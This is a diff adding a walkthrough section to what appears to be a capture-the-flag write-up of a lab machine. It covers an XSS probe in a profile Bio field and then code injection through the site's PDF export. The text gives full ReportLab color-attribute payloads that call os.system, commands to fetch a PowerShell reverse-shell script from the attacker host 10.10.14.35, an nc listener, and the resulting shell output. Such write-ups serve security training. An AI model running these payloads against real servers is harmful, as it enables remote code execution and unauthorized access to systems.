@@ -93,3 +93,125 @@ Let's register for a `Student` account
 The registered `Student` account is immediately usable for login
 
 ![image](https://github.com/user-attachments/assets/2e6b4626-b602-4087-b1d4-f968de386b81)
+
+While testing each field in the profile, it seems that the Bio changes `<script>alert(123)</script>` to just `alert(123)`
+
+→ the site may be susceptible to cross-site scripting
+
+![image](https://github.com/user-attachments/assets/50b9f588-5b7d-43fc-a8af-293e4253d796)
+
+### 2.2. Getting a reverse shell
+
+Some searching shows that this (https://github.com/c53elyas/CVE-2023-337330 may be the vulnerability 
+
+PoC code, replace `curl http://xxx.xxx.xxx.xxx/` with the code to be executed
+
+```xml
+<para>
+  <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('curl http://xxx.xxx.xxx.xxx/') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
+    exploit
+  </font>
+</para>
+```
+
+There's a reverse shell PowerShell script in this repo that should work: https://github.com/joetanx/ctf/blob/main/reverse.ps1
+
+Prepare Kali
+
+```sh
+curl -sLo /var/www/html/reverse.ps1 https://github.com/joetanx/ctf/raw/main/reverse.ps1
+sed -i 's/<ADDRESS>/10.10.14.35/' /var/www/html/reverse.ps1
+sed -i 's/<PORT>/4444/' /var/www/html/reverse.ps1
+```
+
+Start console:
+
+```sh
+root@kali:~# rlwrap nc -nvlp 4444
+listening on [any] 4444 ...
+```
+
+Edit the PoC code to this:
+
+```xml
+<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell Invoke-WebRequest -Uri http://10.10.14.35/reverse.ps1 -OutFile ./reverse.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>
+```
+
+> [!Note]
+>
+> `powershell Invoke-WebRequest -Uri http://10.10.14.35/reverse.ps1 -OutFile ./reverse.ps1'`
+>
+> Downloads the reverse shell script
+
+Put into the Bio editor, submit, then select profile export (it is the html to pdf generator that would execute the command)
+
+![image](https://github.com/user-attachments/assets/5722b636-eb5f-45bc-86e2-dd0ad6190902)
+
+Next, edit the PoC code to this:
+
+```xml
+<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./reverse.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>
+```
+
+> [!Note]
+>
+> `powershell ./reverse.ps1`
+>
+> Runs the reverse shell script
+
+Put into the Bio editor, submit, then select profile export (it is the html to pdf generator that would execute the command)
+
+![image](https://github.com/user-attachments/assets/8188d6bf-6224-4bda-a645-8c8c1fce7009)
+
+Reverse shell hooked as `university\wao` account
+
+```pwsh
+listening on [any] 4444 ...
+connect to [10.10.14.35] from (UNKNOWN) [10.10.11.39] 62164
+
+PS C:\Web\University> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name      SID
+============== =============================================
+university\wao S-1-5-21-2056245889-740706773-2266349663-1106
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\BATCH                         Well-known group S-1-5-3                                       Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
+UNIVERSITY\Web Developers                  Group            S-1-5-21-2056245889-740706773-2266349663-1129 Mandatory group, Enabled by default, Enabled group
+Service asserted identity                  Well-known group S-1-18-2                                      Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeMachineAccountPrivilege     Add workstations to domain     Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+```
